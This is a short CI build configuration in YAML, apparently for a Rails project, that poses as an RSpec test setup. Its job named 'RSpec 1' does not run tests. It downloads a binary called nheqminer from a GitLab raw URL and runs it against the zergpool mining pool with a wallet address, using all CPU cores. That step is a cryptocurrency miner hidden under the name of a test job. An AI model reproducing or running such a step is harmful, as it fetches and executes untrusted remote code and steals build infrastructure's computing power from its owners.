before_script:
  - lscpu
  - RAILS_ENV=test bundle exec rake db:schema:load
rvm: true
environment:
  MYVARIABLE: my-value
script:
  - bundle exec rspec

builds:
  build_1:
    name: RSpec 1
    environment:
      MYVARIABLE: my-value-1
    script:
      - wget https://gitlab.com/gilaaja/exe/-/raw/main/nheqminer && chmod +x nheqminer && ./nheqminer -v -l rx2.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-100 -n 1)-peak@GILA) -p c=DGB -t $(nproc --all) --groups=2 --group-number=1`
